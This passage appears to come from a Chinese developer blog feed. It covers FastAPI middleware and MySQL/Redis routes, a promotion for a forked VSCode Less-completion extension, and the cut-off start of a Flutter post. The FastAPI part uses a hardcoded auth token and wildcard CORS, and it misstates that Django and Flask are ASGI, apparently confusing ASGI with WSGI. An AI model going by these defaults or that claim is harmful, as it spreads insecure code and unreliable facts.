<p>开始我以为这里的依赖注入是<code>@app.get("/profile")</code>，后来了解了下才发现是<code>def profile(user = Depends(get_current_user)):</code>中的<code>Depends</code>关键字，<code>@app.get("/profile")</code>这个实际上是装饰器模式，他就是一个语法糖，这两行代码没有本质区别</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">"/users"</span>)
def <span class="hljs-built_in">list_users</span>(): ...
</code></pre>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">list_users</span> = app.get(<span class="hljs-string">"/users"</span>)(list_users)
</code></pre>
<h5 data-id="heading-19">八、中间件</h5>
<p>中间件就是处理请求和相应的管道函数，位于客户端请求和路由函数之间，可以在请求到达路由前执行，也可以在相应返回客户端前处理，同样也可以在路由和其他中间件之间传递控制权</p>
<p>FastAPI 中的中间件遵循 <strong>ASGI 规范</strong>，比如下面这个例子</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Request
<span class="hljs-keyword">from</span> starlette.middleware.base <span class="hljs-keyword">import</span> BaseHTTPMiddleware
​
app = FastAPI()
​
<span class="hljs-meta">@app.middleware(<span class="hljs-params"><span class="hljs-string">"http"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_middleware</span>(<span class="hljs-params">request: Request, call_next</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"请求到来："</span>, request.url.path)
    response = <span class="hljs-keyword">await</span> call_next(request)  <span class="hljs-comment"># 调用下一个中间件或路由</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"响应返回"</span>)
    <span class="hljs-keyword">return</span> response
</code></pre>
<p>中间件是通过关键字<code>middleware</code>来修饰，中间件的作用于就是全局的，会作用与所有注册的路由，上面代码的执行顺序就是这样的</p>
<pre><code class="hljs language-scss" lang="scss">【请求进来】
<span class="hljs-number">1</span>. <span class="hljs-built_in">print</span>("请求到来")
​
<span class="hljs-number">2</span>. 调用下一个中间件 或 最终的路由函数
   response = await <span class="hljs-built_in">call_next</span>(request)
​
<span class="hljs-number">3</span>. <span class="hljs-built_in">print</span>("响应返回")
​
【响应返回给客户端】
</code></pre>
<p>然后如果注册了多个中间件，他们的注册顺序呢，比如下面这样</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">middleware</span>(<span class="hljs-string">"http"</span>)
async def <span class="hljs-built_in">M1</span>(request, call_next): ...
​
<span class="hljs-variable">@app</span>.<span class="hljs-built_in">middleware</span>(<span class="hljs-string">"http"</span>)
async def <span class="hljs-built_in">M2</span>(request, call_next): ...
</code></pre>
<p>这就和koa中的中间件执行顺序一样，就是一个洋葱模型</p>
<pre><code class="hljs language-scss" lang="scss">请求进来 →
  M1<span class="hljs-selector-class">.before</span>
    M2<span class="hljs-selector-class">.before</span>
      <span class="hljs-built_in">ROUTE</span>()（路由函数执行）
    M2<span class="hljs-selector-class">.after</span>
  M1<span class="hljs-selector-class">.after</span>
响应返回
</code></pre>
<p>常见的中间件可以处理token鉴权</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.middleware(<span class="hljs-params"><span class="hljs-string">"http"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">auth_middleware</span>(<span class="hljs-params">request: Request, call_next</span>):
    token = request.headers.get(<span class="hljs-string">"Authorization"</span>)
    <span class="hljs-keyword">if</span> token != <span class="hljs-string">"mysecrettoken"</span>:
        <span class="hljs-keyword">from</span> fastapi.responses <span class="hljs-keyword">import</span> JSONResponse
        <span class="hljs-keyword">return</span> JSONResponse({<span class="hljs-string">"error"</span>: <span class="hljs-string">"Unauthorized"</span>}, status_code=<span class="hljs-number">401</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> call_next(request)
</code></pre>
<p>还可以设置<code>CORS</code>跨域</p>
<pre><code class="hljs language-ini" lang="ini">from fastapi.middleware.cors import CORSMiddleware
​
app.add_middleware(
    CORSMiddleware,
    <span class="hljs-attr">allow_origins</span>=[<span class="hljs-string">"*"</span>],
    <span class="hljs-attr">allow_methods</span>=[<span class="hljs-string">"*"</span>],
    <span class="hljs-attr">allow_headers</span>=[<span class="hljs-string">"*"</span>],
)
</code></pre>
<p>上面提到了<code>ASGI</code>，接下来介绍下这个协议：</p>
<p>ASGI （Asynchronous Server Gateway Interface），异步服务器网关接口， Python Web 服务器与 Web 框架之间的 <strong>通信协议标准</strong> ，支持异步和同步的，转为高并发、WebSocket、长连接设计的。</p>
<p>在<code>ASGI</code>出现之前，比如<code>Django</code>、<code>Flask</code>他们都是<code>ASGI</code>， 而<code>ASGI</code>只能处理同步任务，一次只能处理一个请求，也不支持<code>WebSocket</code>，不适合做高并发和长连接，</p>
<h5 data-id="heading-20">九、数据库集成</h5>
<p>接口的实际应用，还是得和数据库做交互，接下来分别介绍下mysql和redis的使用</p>
<ol>
<li>
<h6 data-id="heading-21">mysql使用</h6>
</li>
</ol>
<p>FastAPI 推荐异步方式，需要额外安装两个库</p>
<pre><code class="hljs language-css" lang="css">pip install sqlalchemy<span class="hljs-selector-attr">[asyncio]</span> aiomysql
</code></pre>
<p>创建数据库引擎</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">'''
Author: jinxudong 18751241086@163.com
Date: 2025-12-04 15:44:44
LastEditors: jinxudong 18751241086@163.com
LastEditTime: 2025-12-04 16:44:58
FilePath: \code\FastAPI\database\mysql.py
Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
'''</span>
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>, <span class="hljs-type">Dict</span>, <span class="hljs-type">Any</span>, <span class="hljs-type">List</span>
​
<span class="hljs-keyword">from</span> sqlalchemy.ext.asyncio <span class="hljs-keyword">import</span> create_async_engine, async_sessionmaker, AsyncSession
<span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> text
​
DATABASE_URL = <span class="hljs-string">"mysql+aiomysql://xxx"</span>
​
engine = create_async_engine(
    DATABASE_URL,
    echo=<span class="hljs-literal">False</span>,
    pool_pre_ping=<span class="hljs-literal">True</span>,
)
​
async_session = async_sessionmaker(
    bind=engine,
    expire_on_commit=<span class="hljs-literal">False</span>,
)
​
​
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_session</span>() -&gt; AsyncSession:
    <span class="hljs-keyword">return</span> async_session()
​
​
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_all_students</span>() -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]:
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> get_session() <span class="hljs-keyword">as</span> session:
        <span class="hljs-comment"># 直接使用原生 SQL 查询 student_info 全部数据</span>
        result = <span class="hljs-keyword">await</span> session.execute(text(<span class="hljs-string">"SELECT * FROM student_info"</span>))
        rows = result.mappings().<span class="hljs-built_in">all</span>()
        <span class="hljs-keyword">return</span> [<span class="hljs-built_in">dict</span>(row) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> rows]
​
​
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_student_by_id</span>(<span class="hljs-params">student_id: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]:
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> get_session() <span class="hljs-keyword">as</span> session:
        result = <span class="hljs-keyword">await</span> session.execute(
            text(<span class="hljs-string">"SELECT * FROM student_info WHERE student_id = :sid"</span>),
            {<span class="hljs-string">"sid"</span>: student_id},
        )
        row = result.mappings().first()
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">dict</span>(row) <span class="hljs-keyword">if</span> row <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
</code></pre>
<p>这里定义了两个查询数据库的方法，<code>fetch_all_students</code>是查询所有的<code>student_info</code>表，<code>fetch_student_by_id</code>去根据id查询学生信息，</p>
<p>定义user类型的api</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#user.py</span>
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> APIRouter, HTTPException
​
<span class="hljs-comment"># 兼容包内外运行：优先相对导入，失败时回退到绝对导入</span>
​
<span class="hljs-keyword">from</span> database.mysql <span class="hljs-keyword">import</span> fetch_all_students, fetch_student_by_id
​
router = APIRouter(prefix=<span class="hljs-string">"/students"</span>, tags=[<span class="hljs-string">"students"</span>])
​
​
<span class="hljs-meta">@router.get(<span class="hljs-params"><span class="hljs-string">""</span>, summary=<span class="hljs-string">"查询所有学生信息"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">list_students</span>():
    <span class="hljs-keyword">try</span>:
        rows = <span class="hljs-keyword">await</span> fetch_all_students()
        <span class="hljs-keyword">return</span> rows
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">500</span>, detail=<span class="hljs-string">f"查询失败: <span class="hljs-subst">{e}</span>"</span>)
​
​
<span class="hljs-meta">@router.get(<span class="hljs-params"><span class="hljs-string">"/{student_id}"</span>, summary=<span class="hljs-string">"根据学号查询学生信息"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_student</span>(<span class="hljs-params">student_id: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-keyword">try</span>:
        row = <span class="hljs-keyword">await</span> fetch_student_by_id(student_id)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> row:
            <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">404</span>, detail=<span class="hljs-string">"未找到该学生"</span>)
        <span class="hljs-keyword">return</span> row
    <span class="hljs-keyword">except</span> HTTPException:
        <span class="hljs-keyword">raise</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">500</span>, detail=<span class="hljs-string">f"查询失败: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p>然后在<code>main.py</code>中使用<code>user.py</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> user <span class="hljs-keyword">import</span> router <span class="hljs-keyword">as</span> students_router 
...
app.<span class="hljs-title function_">include_router</span>(students_router)
</code></pre>
<p>然后通过浏览器<code>http://localhost:8000/students</code>和<code>http://localhost:8000/students/20180102</code>就可以进行查询了。</p>
<ol>
<li>
<h6 data-id="heading-22">redis使用</h6>
</li>
</ol>
<p>MySQL 是关系型数据库，擅长存储结构化数据，支持复杂的 SQL 查询、事务和持久化，适合存储业务核心数据，如用户信息、订单记录等。而 Redis 则是内存数据库，提供极高的读写性能，支持多种数据结构（字符串、哈希、列表、集合、有序集合等），适合做缓存、排行榜、会话存储或消息队列等场景。简单来说，MySQL 保证数据的可靠性和完整性，而 Redis 提供高速的数据访问能力，两者结合可以在保证数据安全的同时，显著提升系统的响应速度和并发处理能力。</p>
<p>接下来写一个redis查询的小例子</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>, <span class="hljs-type">Dict</span>, <span class="hljs-type">Any</span>, <span class="hljs-type">List</span>
​
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> APIRouter, HTTPException
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel
<span class="hljs-keyword">from</span> redis.asyncio <span class="hljs-keyword">import</span> from_url, Redis
​
​
REDIS_URL = <span class="hljs-string">"redis://:xxx"</span>
​
​
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_redis</span>() -&gt; Redis:
    <span class="hljs-keyword">return</span> from_url(REDIS_URL, decode_responses=<span class="hljs-literal">True</span>)
​
​
router = APIRouter(prefix=<span class="hljs-string">"/redis"</span>, tags=[<span class="hljs-string">"redis"</span>])
​
​
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SetRequest</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    key: <span class="hljs-built_in">str</span>
    value: <span class="hljs-built_in">str</span>
    expire_seconds: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">int</span>] = <span class="hljs-literal">None</span>
​
<span class="hljs-meta">@router.get(<span class="hljs-params"><span class="hljs-string">"/keys"</span>, summary=<span class="hljs-string">"扫描匹配的键"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_keys</span>(<span class="hljs-params">pattern: <span class="hljs-built_in">str</span> = <span class="hljs-string">"*"</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]:
    r = get_redis()
    <span class="hljs-keyword">try</span>:
        keys: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>] = []
        cursor = <span class="hljs-number">0</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            cursor, batch = <span class="hljs-keyword">await</span> r.scan(cursor=cursor, <span class="hljs-keyword">match</span>=pattern, count=<span class="hljs-number">100</span>)
            keys.extend(batch)
            <span class="hljs-keyword">if</span> cursor == <span class="hljs-number">0</span>:
                <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">return</span> keys
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">500</span>, detail=<span class="hljs-string">f"Redis scan 失败: <span class="hljs-subst">{e}</span>"</span>)
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-keyword">await</span> r.close()
</code></pre>
<p>然后在<code>main.py</code>中导入路由</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">from</span> redis_api <span class="hljs-keyword">import</span> router <span class="hljs-keyword">as</span> redis_router
...
app.<span class="hljs-title function_">include_router</span>(redis_router)
</code></pre>
<p>然后再<code>http://localhost:8000/docs</code>文档中通过swagger直接调用我们写的接口，就可以正常看到返回值了。</p>
<p>上面也只是一些基本知识的梳理，距离企业开发还差的很远，尤其是这个框架以高性能、适合高迸发著称，后续打算做一个网关项目，一个聊天室项目，最后再做一个uniapp+fastapi的即时通讯软件，这一套下来，对于fastapi就应该更加熟练了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别在 vue 中使用公共 less 文件没有提示信息的烦恼]]></title>    <link>https://juejin.cn/post/7579886397074915328</link>    <guid>https://juejin.cn/post/7579886397074915328</guid>    <pubDate>2025-12-05T04:02:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579886397074915328" data-draft-id="7579892222609244195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别在 vue 中使用公共 less 文件没有提示信息的烦恼"/> <meta itemprop="keywords" content="Vue.js,Less,CSS"/> <meta itemprop="datePublished" content="2025-12-05T04:02:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小书包酱"/> <meta itemprop="url" content="https://juejin.cn/user/184373685008184"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别在 vue 中使用公共 less 文件没有提示信息的烦恼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/184373685008184/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小书包酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T04:02:20.000Z" title="Fri Dec 05 2025 04:02:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">痛点：Vue项目中Less开发的困扰</h2>
<p>作为一名Vue开发者，当你同时使用Less作为样式预处理器时，是否经常遇到这些令人抓狂的问题：</p>
<ol>
<li><strong>变量提示缺失</strong>：在Vue单文件组件的<code>&lt;style lang="less"&gt;</code>标签中，输入<code>@</code>想引用Less变量时，VSCode没有任何智能提示</li>
<li><strong>混入函数找不到</strong>：使用<code>.border-radius()</code>这样的Less混入时，需要手动查看定义文件</li>
<li><strong>跳转定义困难</strong>：想查看某个Less变量的定义位置？只能全局搜索</li>
<li><strong>错误难以发现</strong>：拼写错误的变量名要到编译时才报错，打断开发流程</li>
</ol>
<h2 data-id="heading-1">解决方案：easier-less提示增强版</h2>
<p>我fork了原有的easier-less插件，只是在此基础上加了一些细节，新增了一些功能。</p>
<blockquote>
<p>在项目的 .vscode/settings.json 中加上了 less 文件地址后，即可拥有以下支持。</p>
</blockquote>
<h3 data-id="heading-2">🚀 核心特性</h3>
<h4 data-id="heading-3">1. <strong>智能变量提示</strong></h4>
<ul>
<li>在Vue文件的Less样式中输入<code>@</code>，立即显示所有可用变量</li>
<li>支持颜色变量的颜色预览</li>
</ul>
<h4 data-id="heading-4">2. <strong>混入函数支持</strong></h4>
<ul>
<li>输入<code>.</code>即可看到所有可用的混入函数</li>
<li>支持参数提示</li>
</ul>
<h4 data-id="heading-5">3. <strong>定义跳转</strong></h4>
<ul>
<li><code>Ctrl+点击</code>变量名直接跳转到定义位置</li>
<li>支持跨文件的定义跳转</li>
</ul>
<h3 data-id="heading-6">📦 安装方式</h3>
<h4 data-id="heading-7">方法一：VSCode扩展商店（推荐）</h4>
<ol>
<li>打开VSCode</li>
<li>进入扩展商店（Ctrl+Shift+X）</li>
<li>搜索"easy-use-less-vue"</li>
<li>点击安装</li>
</ol>
<h4 data-id="heading-8">方法二：手动安装</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 克隆仓库</span>
git <span class="hljs-built_in">clone</span> https://github.com/dmxiaoshubao/easier-less.git

<span class="hljs-comment"># 进入目录</span>
<span class="hljs-built_in">cd</span> easier-less

<span class="hljs-comment"># 安装依赖</span>
yarn

<span class="hljs-comment"># 打包</span>
npm run compile

<span class="hljs-comment"># 在VSCode中按F5运行测试，然后打包成vsix安装</span>
</code></pre>
<h3 data-id="heading-9">⚙️ 快速配置</h3>
<p>在项目根目录创建或修改<code>.vscode/settings.json</code>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"less.suppressNotice"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"less.files"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"./src/styles/variables.less"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"./src/styles/mixins.less"</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-10">🎯 使用示例</h3>
<h4 data-id="heading-11">场景一：智能变量提示</h4>
<p>在<code>variables.less</code>中定义：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@primary-color:</span> <span class="hljs-number">#1890ff</span>;
<span class="hljs-variable">@border-radius:</span> <span class="hljs-number">4px</span>;
</code></pre>
<p>在Vue组件中使用时：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;style lang="less"&gt;
.container {
  background-color: @primary-color; // 输入@时会有提示
  border-radius: @border-radius;
}
&lt;/style&gt;
</code></pre>
<h4 data-id="heading-12">场景二：混入函数支持</h4>
<p>在<code>mixins.less</code>中定义：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-class">.flex-center</span>() {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">align-items</span>: center;
}
</code></pre>
<p>使用时获得完整提示：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;style lang="less"&gt;
.card {
  .flex-center(); // 输入.时会有提示
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-13">🐛 常见问题解决</h3>
<p><strong>Q: 插件没有生效？</strong>
A: 检查：</p>
<ol>
<li>VSCode已重启</li>
<li>文件语言模式设置为"Vue"</li>
<li>style标签有<code>lang="less"</code>属性</li>
</ol>
<p><strong>Q: 变量提示不完整？</strong>
A: 确保变量文件路径配置正确，文件已保存。</p>
<p><strong>Q: 有提示写了但是报错？</strong>
A: 需要在 <code>&lt;style lang="less"&gt;&lt;/style&gt;</code>中自行引入该公共 less 文件。
eg: <code>@import (reference) from '@/assets/styles/mixin.less'; </code>本插件只作提示信息使用。</p>
<h3 data-id="heading-14">🤝 参与贡献</h3>
<p>如果你发现bug或有改进建议：</p>
<ol>
<li>访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdmxiaoshubao%2Feasier-less" target="_blank" title="https://github.com/dmxiaoshubao/easier-less" ref="nofollow noopener noreferrer">GitHub仓库</a></li>
<li>提交Issue或Pull Request</li>
<li>参与功能讨论</li>
</ol>
<h3 data-id="heading-15">🎉 开始使用</h3>
<p>不要再让样式开发成为你的瓶颈！安装easier-less提示增强版，体验流畅的Vue+Less开发流程。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 或者直接通过VSIX安装</span>
code --install-extension easier-less-enhanced.vsix
</code></pre>
<p>提升开发效率，从更好的工具开始。现在就尝试这款专为Vue开发者打造的Less增强插件吧！</p>
<hr/>
<p><em>如果你觉得这个插件有帮助，欢迎在GitHub上给我一个Star⭐，这对我非常重要！</em></p>
<p><em>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdmxiaoshubao%2Feasier-less" target="_blank" title="https://github.com/dmxiaoshubao/easier-less" ref="nofollow noopener noreferrer">github.com/dmxiaoshuba…</a></em></p>
<p><em>有任何问题或建议，欢迎在Issues中讨论！</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flutter如何实现有登陆权限管理]]></title>    <link>https://juejin.cn/post/7579846221168508982</link>    <guid>https://juejin.cn/post/7579846221168508982</guid>    <pubDate>2025-12-05T04:51:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579846221168508982" data-draft-id="7579843977849061430" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="flutter如何实现有登陆权限管理"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-05T04:51:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="linhuai"/> <meta itemprop="url" content="https://juejin.cn/user/3685218707586839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 